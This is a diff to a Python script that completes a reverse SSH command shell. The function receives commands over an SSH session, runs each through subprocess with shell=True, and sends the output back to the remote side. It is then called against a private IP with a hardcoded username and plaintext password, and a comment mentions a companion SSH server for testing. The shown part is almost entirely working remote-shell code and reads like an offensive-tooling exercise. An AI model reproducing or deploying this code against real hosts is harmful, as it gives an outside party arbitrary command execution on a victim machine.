@@ -28,4 +28,18 @@ def ssh_command_reverse(ip,user,passw,command):
             if command.lower()=="exit":
                 break
             try:
-                output=subprocess.check_
+                output=subprocess.check_output(command,shell=True)
+                ssh_session.send(output)
+            except:
+                ssh_session.send(b"Command execution failed")
+            finally:
+                continue
+            client.close()
+    
+    return
+
+ssh_command_reverse('192.168.121.138','justin','mypassword','ClientConnected')
+# I have created a SSH server through which we can test our connection in the file called SSH_server.py
+
+
+
